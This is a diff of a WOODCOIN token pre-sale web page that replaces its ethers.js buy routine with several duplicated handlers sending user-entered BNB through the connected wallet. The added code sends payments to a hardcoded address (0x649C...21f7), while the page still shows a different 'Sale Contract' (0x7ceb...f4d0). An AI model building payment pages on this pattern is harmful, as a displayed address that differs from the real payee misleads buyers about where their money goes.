@@ -2,7 +2,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>WOODCOIN Pre-Sale</title>
@@ -227,7 +226,7 @@ try {
 
   <br/>
   <button onclick="addToken()">Add WOODCOIN to Wallet</button>
-  <button type="button" id="buy-btn" onclick="buyWoodcoin()" style="background:#555;color:#999;cursor:not-allowed;">Buy Now</button>
+  <button onclick="buyWoodcoin()" disabled style="background:#555;color:#999;cursor:not-allowed;">Buy Now</button>
 <br>
 <input type="number" id="bnbAmount" placeholder="Enter BNB amount" 
 style="margin-top: 10px; padding: 10px; font-size: 16px; border-radius: 8px; width: 80%; max-width: 300px;">
@@ -244,7 +243,9 @@ style="margin-top: 10px; padding: 10px; font-size: 16px; border-radius: 8px; wid
     <div class="note">Live balance from BSC Mainnet</div>
     <p class="note">
       Sale Contract:
-      <a href="https://bscscan.com/address/0x7cebc99b114138152D54589BaF6a386b5435f4d0" target="_blank">0x7ceb...f4d0</a>
+      <a href="https://bscscan.com/address/0x7cebc99b114138152D54589BaF6a386b5435f4d0" target="_blank">
+        0x7ceb...f4d0
+      </a>
     </p>
   </div>
 
@@ -589,99 +590,419 @@ window.addEventListener('load', updateWalletStatus);
 </script>
 
 
-  
+  <script>
+  (function(){
+    function shorten(addr){
+      if(!addr || typeof addr !== 'string') return '';
+      return addr.slice(0,6) + '...' + addr.slice(-4);
+    }
+    function showBadge(address){
+      var el = document.getElementById('wallet-status');
+      if(!el) return;
+      if(address){
+        el.textContent = 'W ✔ Connected — ' + shorten(address);
+        el.style.display = 'inline-block';
+      } else {
+        el.style.display = 'none';
+      }
+    }
+    async function checkAccounts(){
+      try{
+        if(window.ethereum && window.ethereum.request){
+          var accs = await window.ethereum.request({ method: 'eth_accounts' });
+          if(accs && accs.length > 0){
+            showBadge(accs[0]);
+          } else {
+            showBadge(null);
+          }
+        }
+      }catch(e){
+        console.warn('Wallet check failed:', e);
+      }
+    }
 
+    // Listen for account changes
+    if(window.ethereum){
+      try{
+        window.ethereum.on && window.ethereum.on('accountsChanged', function(accs){
+          if(accs && accs.length > 0){ showBadge(accs[0]); } else { showBadge(null); }
+        });
+      }catch(e){}
+    }
 
+    // Intercept eth_requestAccounts to update badge right after connect
+    if(window.ethereum && window.ethereum.request){
+      try{
+        var _origReq = window.ethereum.request.bind(window.ethereum);
+        window.ethereum.request = async function(args){
+          var res = await _origReq(args);
+          try{
+            if(args && args.method === 'eth_requestAccounts'){
+              var accs = Array.isArray(res) ? res : (await _origReq({method:'eth_accounts'}));
+              if(accs && accs.length > 0){ showBadge(accs[0]); }
+            }
+          }catch(e){}
+          return res;
+        }
+      }catch(e){}
+    }
+
+    document.addEventListener('DOMContentLoaded', checkAccounts);
+    // Also re-check on visibility change (returns to tab)
+    document.addEventListener('visibilitychange', function(){ if(!document.hidden) checkAccounts(); });
+    // Periodic gentle check (fails silently)
+    setInterval(checkAccounts, 15000);
+  })();
+  </script>
+
+  <script>
+    (function(){
+      async function addBsc(){
+        if(!(window.ethereum && window.ethereum.request)){
+          alert('No wallet detected. Please install MetaMask or a compatible wallet.');
+          return;
+        }
+        try{
+          // Add BNB Smart Chain (Mainnet)
+          await window.ethereum.request({
+            method: 'wallet_addEthereumChain',
+            params: [{
+              chainId: '0x38', // 56
+              chainName: 'BNB Smart Chain',
+              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+              rpcUrls: ['https://bsc-dataseed.binance.org/'],
+              blockExplorerUrls: ['https://bscscan.com']
+            }]
+          });
+          // Switch to it (in case wallet needs explicit switch)
+          try{
+            await window.ethereum.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: '0x38' }]
+            });
+          }catch(eSwitch){
+            // ignore if user rejected or already on chain
+            console.warn('switch error', eSwitch);
+          }
+          // Optional small confirmation
+          var btn = document.getElementById('add-bsc-btn');
+          if(btn){ btn.textContent = 'BNB Chain Added ✓'; btn.disabled = true; btn.style.opacity = '0.8'; }
+        }catch(e){
+          console.warn('Add BSC failed:', e);
+          alert('Could not add BNB Smart Chain: ' + (e && e.message ? e.message : e));
+        }
+      }
+      document.addEventListener('DOMContentLoaded', function(){
+        var btn = document.getElementById('add-bsc-btn');
+        if(btn){ btn.addEventListener('click', addBsc); }
+      });
+    })();
+  </script>
 
 <script>
+document.addEventListener("DOMContentLoaded", function() {
+  const input = document.getElementById("bnb-amount");
+  const btn = document.getElementById("buy-btn");
+
+  if(input && btn){
+    input.addEventListener("input", function() {
+      const val = parseFloat(input.value);
+      if(!isNaN(val) && val > 0){
+        btn.disabled = false;
+        btn.style.background = "#f0b90b";   // BNB yellow
+        btn.style.color = "#111";
+        btn.style.cursor = "pointer";
+      } else {
+        btn.disabled = true;
+        btn.style.background = "#555";
+        btn.style.color = "#999";
+        btn.style.cursor = "not-allowed";
+      }
+    });
+  }
+});
+</script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+  const btn = document.getElementById("buy-btn");
+  const input = document.getElementById("bnb-amount");
+  const SALE_ADDRESS = "0x649C483a9eD3F730ffCDbF8501d5B045800221f7";
+
+  if(btn && input){
+    btn.addEventListener("click", async function() {
+      const val = parseFloat(input.value);
+
+      if(!window.ethereum){
+        alert("Please install MetaMask or a compatible wallet.");
+        return;
+      }
+
+      try {
+        const accounts = await ethereum.request({ method: 'eth_accounts' });
+        if(!accounts || accounts.length === 0){
+          alert("Please connect your wallet first.");
+          return;
+        }
+
+        if(isNaN(val) || val <= 0){
+          alert("Enter a valid BNB amount.");
+          return;
+        }
+
+        const tx = {
+          from: accounts[0],
+          to: SALE_ADDRESS,
+          value: "0x" + (BigInt(Math.floor(val * 1e18)).toString(16))
+        };
+
+        const txHash = await ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [tx]
+        });
+
+        alert("Transaction sent! TX Hash: " + txHash);
+      } catch (err) {
+        console.error(err);
+        alert("Transaction failed: " + (err.message || err));
+      }
+    });
+  }
+});
+</script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+  const btn = document.getElementById("buy-btn");
+  const input = document.getElementById("bnb-amount");
+  const SALE_ADDRESS = "0x649C483a9eD3F730ffCDbF8501d5B045800221f7";
+
+  function toHexWei(bnb){
+    try { return "0x" + (BigInt(Math.floor(Number(bnb) * 1e18)).toString(16)); }
+    catch(e){ return null; }
+  }
+
+  if(btn && input){
+    btn.addEventListener("click", async function() {
+      const val = parseFloat(input.value);
+
+      if(!window.ethereum){
+        alert("Please install MetaMask or a compatible wallet.");
+        return;
+      }
+
+      try {
+        // Check connection
+        let accounts = await ethereum.request({ method: 'eth_accounts' });
+        if(!accounts || accounts.length === 0){
+          // Prompt connect, then re-check
+          accounts = await ethereum.request({ method: 'eth_requestAccounts' }).catch(() => []);
+          if(!accounts || accounts.length === 0){
+            alert("Please connect your wallet first.");
+            return;
+          }
+        }
+
+        // Validate amount
+        if(isNaN(val) || val <= 0){
+          alert("Enter a valid BNB amount.");
+          return;
+        }
+
+        // Optionally warn if not on BSC (chainId 0x38)
+        try{
+          const chainId = await ethereum.request({ method: 'eth_chainId' });
+          if(chainId !== '0x38'){
+            const go = confirm("You are not on BNB Smart Chain. Switch now?");
+            if(go){
+              try{
+                await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+              }catch(eSwitch){ /* user might reject; continue or abort */ }
+            }
+          }
+        }catch(e){ /* ignore */ }
+
+        const weiHex = toHexWei(val);
+        if(!weiHex){
+          alert("Invalid amount.");
+          return;
+        }
+
+        const tx = {
+          from: accounts[0],
+          to: SALE_ADDRESS,
+          value: weiHex
+        };
+
+        const txHash = await ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
+        alert("Transaction sent! TX Hash: " + txHash);
+      } catch (err) {
+        console.error(err);
+        alert("Transaction failed: " + (err && err.message ? err.message : err));
+      }
+    });
+  }
+});
+</script>
+
+<script>
+// === WOODCOIN BUY: wiring for existing markup ===
 (function(){
-  function showToast(msg){
-    var t = document.getElementById('toast-box');
-    if(!t) return alert(msg);
-    t.textContent = msg;
-    t.style.display = 'block';
-    setTimeout(function(){ t.style.display = 'none'; }, 3500);
-  }
-
-  const CANDIDATES = [
-    "buyTokens",
-    "buy",
-    "purchase",
-    "contribute",
-    "invest",
-    "buyWOOD"
-  ];
-
-  function parseBNB(val){
-    try { return ethers.utils.parseEther(String(val)); } catch(e){ return null; }
-  }
-
-  async function ensureProvider(){
-    if(!(window.ethereum && window.ethereum.request)){
-      alert("Please install MetaMask or a compatible wallet.");
-      return null;
+  function styleDisabled(btn, disabled){
+    if(!btn) return;
+    btn.disabled = !!disabled;
+    if(disabled){
+      btn.style.background = "#555";
+      btn.style.color = "#999";
+      btn.style.cursor = "not-allowed";
+    } else {
+      btn.style.background = "#f0b90b";
+      btn.style.color = "#111";
+      btn.style.cursor = "pointer";
     }
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
-    return provider;
   }
 
-  // Replace/globalize buyWoodcoin
+  async function ensureConnected(){
+    if(!(window.ethereum && window.ethereum.request)) return null;
+    let accs = await ethereum.request({ method: 'eth_accounts' });
+    if(!accs || accs.length === 0){
+      try{ accs = await ethereum.request({ method: 'eth_requestAccounts' }); }
+      catch(e){ return null; }
+    }
+    return (accs && accs[0]) ? accs[0] : null;
+  }
+
+  function toHexWei(bnb){
+    try { return "0x" + (BigInt(Math.floor(Number(bnb) * 1e18)).toString(16)); }
+    catch(e){ return null; }
+  }
+
+  // Patch the global buyWoodcoin used by the existing button
   window.buyWoodcoin = async function(){
     const input = document.getElementById("bnbAmount");
-    const amount = input ? input.value : "";
-    if(!amount || Number(amount) <= 0){ alert("Enter a valid BNB amount."); return; }
+    const amount = input ? parseFloat(input.value) : NaN;
 
-    const provider = await ensureProvider(); if(!provider) return;
-    const signer = provider.getSigner();
-
-    // Ensure BSC mainnet
-    try{
-      const chainId = await provider.send("eth_chainId", []);
-      if(chainId !== "0x38"){
-        try{ await provider.send("wallet_switchEthereumChain", [{ chainId: "0x38" }]); }
-        catch(e){ /* user may reject; continue */ }
-      }
-    }catch(e){}
-
-    // Build contract with candidate ABIs dynamically
-    const candidateAbis = CANDIDATES.map(name => [`function ${name}() payable`]);
-    const valueWei = parseBNB(amount);
-    if(!valueWei){ alert("Invalid amount."); return; }
-
-    // Try methods with estimateGas as probe
-    let chosen = null, methodName = null;
-    for(const abi of candidateAbis){
-      const name = abi[0].match(/function\s+(\w+)/)[1];
-      try{
-        const c = new ethers.Contract(SALE_ADDRESS, abi, signer);
-        if(c.estimateGas && c.estimateGas[name]){
-          await c.estimateGas[name]({ value: valueWei });
-          chosen = c; methodName = name;
-          break;
-        }
-      }catch(err){
-        // continue trying the next method
-      }
+    if(!window.ethereum){
+      alert("Please install MetaMask or a compatible wallet.");
+      return;
     }
-
+    const from = await ensureConnected();
+    if(!from){
+      alert("Please connect your wallet first.");
+      return;
+    }
+    if(isNaN(amount) || amount <= 0){
+      alert("Enter a valid BNB amount.");
+      return;
+    }
     try{
-      let tx;
-      if(chosen && methodName){
-        tx = await chosen[methodName]({ value: valueWei, gasLimit: 300000 });
-      }else{
-        // Fallback to payable receive()
-        tx = await signer.sendTransaction({ to: SALE_ADDRESS, value: valueWei, gasLimit: 300000 });
-      }
-      showToast("Transaction sent!");
-      alert("Transaction sent! TX Hash: " + tx.hash);
+      // Optional: switch to BSC
+      try{
+        const chainId = await ethereum.request({ method: 'eth_chainId' });
+        if(chainId !== '0x38'){
+          await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+        }
+      }catch(e){ /* user may reject; continue on their current chain */ }
+
+      const SALE_ADDRESS = "0x649C483a9eD3F730ffCDbF8501d5B045800221f7";
+      const tx = {
+        from,
+        to: SALE_ADDRESS,
+        value: toHexWei(amount)
+      };
+      const txHash = await ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
+      alert("Transaction sent! TX Hash: " + txHash);
     }catch(err){
       console.error(err);
       alert("Transaction failed: " + (err && err.message ? err.message : err));
     }
   };
 
-  // Enable/disable button bound by onclick, based on #bnbAmount
+  // Enable/disable button based on #bnbAmount value
+  document.addEventListener("DOMContentLoaded", function(){
+    const input = document.getElementById("bnbAmount");
+    const buyBtn = document.querySelector('button[onclick="buyWoodcoin()"]');
+    if(buyBtn){
+      styleDisabled(buyBtn, true); // default disabled
+    }
+    if(input){
+      const onInput = function(){
+        const v = parseFloat(input.value);
+        styleDisabled(buyBtn, !(v > 0));
+      };
+      input.addEventListener("input", onInput);
+      onInput();
+    }
+  });
+})();
+</script>
+
+<script>
+(function(){
+  const SALE_ADDRESS = "0x649C483a9eD3F730ffCDbF8501d5B045800221f7";
+
+  function toHexWei(bnb){
+    try { return "0x" + (BigInt(Math.floor(Number(bnb) * 1e18)).toString(16)); }
+    catch(e){ return null; }
+  }
+
+  async function ensureConnected(){
+    if(!(window.ethereum && window.ethereum.request)){
+      alert("Please install MetaMask or a compatible wallet.");
+      return null;
+    }
+    let accounts = await ethereum.request({ method: 'eth_accounts' });
+    if(!accounts || accounts.length === 0){
+      try { accounts = await ethereum.request({ method: 'eth_requestAccounts' }); }
+      catch(e){ accounts = []; }
+    }
+    if(!accounts || accounts.length === 0){
+      alert("Please connect your wallet first.");
+      return null;
+    }
+    return accounts[0];
+  }
+
+  // Define buyWoodcoin globally to match the existing onclick
+  window.buyWoodcoin = async function(){
+    const input = document.getElementById("bnbAmount");
+    const val = input ? parseFloat(input.value) : NaN;
+
+    if(isNaN(val) || val <= 0){
+      alert("Enter a valid BNB amount.");
+      return;
+    }
+
+    const from = await ensureConnected();
+    if(!from) return;
+
+    // Optional: try switching to BSC mainnet
+    try{
+      const chainId = await ethereum.request({ method: 'eth_chainId' });
+      if(chainId !== '0x38'){
+        const go = confirm("You are not on BNB Smart Chain. Switch now?");
+        if(go){
+          try{ await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] }); }catch(e){}
+        }
+      }
+    }catch(e){}
+
+    const weiHex = toHexWei(val);
+    if(!weiHex){ alert("Invalid amount."); return; }
+
+    try{
+      const txHash = await ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [ { from, to: SALE_ADDRESS, value: weiHex } ]
+      });
+      alert("Transaction sent! TX Hash: " + txHash);
+    }catch(err){
+      console.error(err);
+      alert("Transaction failed: " + (err && err.message ? err.message : err));
+    }
+  };
+
+  // Enable/disable button based on #bnbAmount input
   document.addEventListener("DOMContentLoaded", function(){
     const input = document.getElementById("bnbAmount");
     const btn = document.querySelector('button[onclick="buyWoodcoin()"]');
@@ -695,75 +1016,10 @@ window.addEventListener('load', updateWalletStatus);
     }
     if(input){
       input.addEventListener("input", refresh);
+      // initial
       refresh();
     }
   });
-})();
-</script>
-
-<script>
-(function(){
-  function getBuyBtn(){
-    return document.getElementById('buy-btn') || document.querySelector('button[onclick="buyWoodcoin()"]') || Array.from(document.querySelectorAll('button')).find(b => /buy now/i.test(b.textContent || ''));
-  }
-  function getAmountInput(){
-    return document.getElementById('bnbAmount') || document.querySelector('input[type="number"]#bnbAmount') || document.querySelector('input[type="number"]');
-  }
-  function setEnabled(enabled){
-    var btn = getBuyBtn();
-    if(!btn) return;
-    btn.disabled = !enabled;
-    if(enabled){
-      btn.style.background = "#f0b90b";
-      btn.style.color = "#111";
-      btn.style.cursor = "pointer";
-    }else{
-      btn.style.background = "#555";
-      btn.style.color = "#999";
-      btn.style.cursor = "not-allowed";
-    }
-  }
-  function refresh(){
-    var input = getAmountInput();
-    var val = input ? parseFloat(input.value) : NaN;
-    setEnabled(!isNaN(val) && val > 0);
-  }
-  document.addEventListener('DOMContentLoaded', function(){
-    var input = getAmountInput();
-    if(input){
-      input.addEventListener('input', refresh);
-      input.addEventListener('change', refresh);
-    }
-    refresh();
-  });
-  // Periodic safety check in case DOM re-renders
-  setInterval(refresh, 2000);
-})();
-</script>
-
-<script>
-(function(){
-  function bindBuyClick(){
-    if(window._wc_buy_click_bound) return;
-    var btn = document.getElementById('buy-btn') || document.querySelector('button[onclick="buyWoodcoin()"]');
-    if(!btn) return;
-    btn.addEventListener('click', function(ev){
-      try{
-        ev.preventDefault(); ev.stopPropagation();
-      }catch(e){}
-      if(typeof buyWoodcoin === 'function'){
-        console.log('[WOODCOIN] Buy button clicked');
-        buyWoodcoin();
-      }else{
-        alert('Action not ready. Please reload the page.');
-        console.warn('[WOODCOIN] buyWoodcoin() not found');
-      }
-    }, { passive:false });
-    window._wc_buy_click_bound = true;
-  }
-  document.addEventListener('DOMContentLoaded', bindBuyClick);
-  // Safety rebind if DOM changes
-  setInterval(bindBuyClick, 1500);
 })();
 </script>
 </body>
